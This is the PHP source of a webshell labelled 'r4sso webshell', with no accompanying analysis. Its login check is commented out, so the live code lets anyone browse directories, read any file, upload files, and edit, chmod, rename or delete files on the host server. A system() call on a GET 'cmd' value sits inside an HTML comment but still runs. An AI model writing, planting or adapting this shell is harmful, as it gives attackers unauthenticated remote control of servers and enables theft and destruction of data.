<?php
//===============================================
//Author: r4sso | github.com/r4sso
//===============================================


$password= "202cb962ac59075b964b07152d234b70";

/*
function login_shell() {
  ?>
  <!DOCTYPE HTML>
  <html>
  <head>
  <meta name="robots" content"noindex. nofollow">
  <title>r4sso webshell</title>
  <style type="text/css">
  html {
    background: #000000;
    color: lime;
    font-size: 20px;
  }
  header {
    color: lime;
  }
  input[type=password] {
    color: lime;
    background: transparent;
    border: 1px solid black;
  }
  </style>
  </head>
  <header>
    <pre>

r4sso@tux:~# whoami
      _  _                 
 _ __| || |  ___ ___  ___  
| '__| || |_/ __/ __|/ _ \ 
| |  |__   _\__ \__ \ (_) |
|_|     |_| |___/___/\___/ 

                                                      
r4sso@tux:~# sudo su
<form method="post">Password: <input type="password" name="password">
  </form>
    </pre>
  </header>
  <?php
  exit;
  }
  
  if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
      if(empty($password) || (isset($_POST['password']) && (md5($_POST['password']) == $password)))
          $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
      else
          login_shell();
  
  if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
      @ob_clean();
      $file = $_GET['file'];
      header('Content-Description: File Transfer');
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename="'.basename($file).'"');
      header('Expires: 0');
      header('Cache-Control: must-revalidate');
      header('Pragma: public');
      header('Content-Length: ' . filesize($file));
      readfile($file);
      exit;
  }
  
  if(get_magic_quotes_gpc()) {
    function idx_ss($array) {
      return is_array($array) ? array_map('idx_ss', $array) : stripslashes($array);
    }
    $_POST = idx_ss($_POST);
  }
*/

echo "Uname: <font color='lime'>", php_uname(),"</font><br>";
echo "OS: <font color='lime'>", PHP_OS, "</font><br>";
echo "Host IP: <font color='lime'>".$_SERVER['REMOTE_ADDR'], "</font><br>";
$df = round(disk_free_space("/") / 1024 / 1024 / 1024);
$ds = round(disk_total_space("/") /1024 /1024 /1024);
echo "Free space: <font color='lime'>$df / $ds GB</font><br>";

if(isset($_GET['path'])) {
	$path = $_GET['path'];
} else {
	$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pf) {
	if($pf == '' and $id == 0) {
		echo 'Current path: <a href="#">/</a>';
		continue;
	}
	if($pf == '') continue;
	echo '<a href="?path=';
	for($i=0;$i<=$id;$i++) {
		echo $paths[$i];
		if($i != $id) echo '/';
	}
	echo '">'.$pf.'</a>/';
}


if(!empty($_FILES['uploaded_file']))
{
  $path = "";
  $path = $path . basename( $_FILES['uploaded_file']['name']);

  if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
    echo "<br>";
    echo "<font color='lime'> ".  basename( $_FILES['uploaded_file']['name']). 
    " has been uploaded</font>";
  } else{
      echo "<br>";
      echo "<font color='red'>Something when wrong, please try again!</font>";
  }
}

?>
<html>
<head>
  <title>r4sso webshell</title>
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css2?family=Creepster&display=swap">
  <style>
  body {
    background-color:black;
    color:white;
    font-family: Courier New, Creepster;
  }

  a {
    color:lime;
  }

  table, th, td {
    border: 1px solid white;
    padding: 5px 150px 5px;
    text-align:center;
    width:auto;
  }

  </style>
</head>
<body>
  <form class ="fup" action="" method="POST" enctype="multipart/form-data">
         <input type="file" name="uploaded_file">
         <input type="submit" value="Upload file">
    </form>

     
  <!--
    <div class="cmd">
    <?php 
    if(isset($_GET['cmd']))
    {
      system($_GET['cmd']);
    }
    
    ?>    
    <form method="get" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
      <input placeholder="Just Send It!" type="text" name="cmd" id="cmd" size="80">
      <input type="submit" value="Execute">
    </form>
    </div>

    -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
</body>
</html>
<?php
if(isset($_GET['filesrc'])) {?>

  <font color=lime><?php echo $_GET['filesrc']; ?></font>
  <textarea class="form-control" readonly><?php echo htmlspecialchars(file_get_contents($_GET['filesrc'])); ?></textarea>
  <br><?php
} elseif(isset($_POST['option']) && $_POST['option'] != 'action') {?>

  <font color=lime><?php echo $_POST['path']; ?><?php
if($_POST['option'] == 'chmod') {
if(isset($_POST['perms'])) {
  if(chmod($_POST['path'],$_POST['perms'])) {?>

    <br><font color=lime>Success</font></h3><?php
  } else {?>

    <script>alert('Error!')</script>
    <br><font color=red>Error</font><?php
  }
}?>

    <form method="post">
      <input type="hidden" name="path" value="<?php echo $_POST['path']; ?>">
      <input type="hidden" name="option" value="chmod">
      <input type="text" name="perms" value="<?php echo substr(sprintf('%o', fileperms($_POST['path'])), -4); ?>" required>
      <input type="submit" value="submit">

    </form><?php
} elseif($_POST['option'] == 'rename') {
if(isset($_POST['newname'])) {
  if(rename($_POST['path'],$path.'/'.$_POST['newname'])) {?>

    <br><font color=lime>File Has Been Changed</font><?php
  } else {?>

    <script>alert("Error!")</script>
    <br><font color=red>Error!</font><?php
  }
  $_POST['name'] = $_POST['newname'];
}?>

    <form method="post">
      <input type="text" name="newname" value="<?php echo $_POST['name']; ?>">
      <input type="hidden" name="option" value="rename">
      <input type="hidden" name="path" value="<?php echo $_POST['path']; ?>">
      <input type="submit" value="submit">
    </form><?php
} elseif($_POST['option'] == 'edit') {
if(isset($_POST['src'])) {
  $fp = fopen($_POST['path'],'w');
  if(fwrite($fp, $_POST['src'])) {?>

    <br><font color=lime>File Has Been Modified</font><?php
  } else {?>

    <script>alert('Error!')</script>
    <br><font color=red>Error!</font><?php
  }
  fclose($fp);
}?>

    <form method="post">
      <input type="hidden" name="option" value="edit">
      <input type="hidden" name="path" value="<?php echo $_POST['path']; ?>">
      <textarea class="form-control" name="src"><?php echo htmlspecialchars(file_get_contents($_POST['path'])); ?></textarea>
      <input type="submit" value="DONE">
    </form><?php
} elseif($_POST['option'] == 'delete') {
if($_POST['type'] == 'dir') {
  if(@rmdir($_POST['path'])) {?>

    <br><font color=lime>File Has Been Deleted</font><?php
  } else {?>

    <script>alert("Error!")</script>
    <br><font color=red>Error!</font><?php
  }
} elseif($_POST['type'] == 'file') {
  if(unlink($_POST['path'])) {?>

    <br><font color=lime>File Has Been Deleted</font><?php
  } else {?>

    <script>alert('Error!')</script>
    <br><font color=red>Error!</font><?php
  }

}
}

}
?>
<table class="tab">
  <thead>
  <tr>
      <th scope="col">Name</th>
      <th scope="col">Size</th>
      <th scope="col">Permission</th>
      <th scope="col">Options</th>
  </tr>
  </thead>  
<?php
$scandir = scandir($path);
foreach($scandir as $dir) {
if(!is_dir("$path/$dir") || $dir == '..' || $dir == '.') continue;?>

  <tr>
    <td class="td_home"><a href="?path=<?php echo $path.'/'.$dir; ?>"><?php echo $dir; ?></a></td>
    <td class="td_home"><font size="1px" color=lime>DIR</font></td>
    <td class="td_home"><?php
if(is_writable("$path/$dir")) echo '<font color=lime>';
elseif(!is_readable("$path/$dir")) echo '<font color="#FF0004">';
echo perms("$path/$dir");
if(is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font></td>'; ?>

    <td class="td_home">
      <form method="post">
        <input type="hidden" name="path" value="<?php echo $path.'/'.$dir; ?>">
        <input type="hidden" name="type" value="dir">
        <input type="hidden" name="name" value="<?php echo $dir; ?>">
        <select name="option" required>
          <option value="">Action</option>
          <option value="delete">Delete</option>
          <option value="chmod">Chmod</option>
          <option value="rename">Rename</option>
        <select>
        <input type="submit" value=">>">
      </form>
    </td>
  </tr><?php
}
foreach($scandir as $file) {
if(!is_file("$path/$file")) continue;
$size = filesize("$path/$file")/1024;
$size = round($size,3);
if($size >= 1024) {
$size = round($size/1024,2).' MB';
} else {
$size = $size.' KB';
}?>

  <tr>
    <td class="td_home"><a href="?filesrc=<?php echo $path.'/'.$file; ?>"><?php echo $file; ?></a></td>
    <td class="td_home"><?php echo $size; ?></td>
    <td class="td_home"><?php
if(is_writable("$path/$file")) echo '<font color=lime>';
elseif(is_readable("$path/$file")) echo '<font color="#FF0004">';
echo perms("$path/$file");
if(is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
echo '</td>';?>
    <td class="td_home">
      
        <form method="post">
          <select name="option" required>
            <option value="">Action</option>
            <option value="delete">Delete</option>
            <option value="edit">Edit</option>
            <option value="chmod">Chmod</option>
            <option value="rename">Rename</option>
          </select>
          <input type="hidden" name="type" value="file">
          <input type="hidden" name="name" value="<?php echo $file; ?>">
          <input type="hidden" name="path" value="<?php echo $path.'/'.$file; ?>">
          <input type="submit" value=">>">
        </form>
      
    </td><?php
}
?>
    <tr>
    <td colspan="4">r4sso@github.com</td>
    </tr>
  </table>
</body>
</html><?php

function perms($file) {
$perms = fileperms($file);
if(($perms & 0xC000) == 0xC000) {
$info = 's';
} elseif(($perms & 0xA000) == 0xA000) {
$info = 'l';
} elseif(($perms & 0x8000) == 0x8000) {
$info = '-';
} elseif(($perms & 0x6000) == 0x6000) {
$info = 'b';
} elseif(($perms & 0x4000) == 0x4000) {
$info = 'd';
} elseif(($perms & 0x2000) == 0x2000) {
$info = 'c';
} elseif(($perms & 0x1000) == 0x1000) {
$info = 'p';
} else {
$info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($parms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

$info .= (($perms & 0x004) ? 'r' : '-');
$info .= (($perms & 0x002) ? 'w' : '-');
$info .= (($perms & 0x001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
return $info;
}
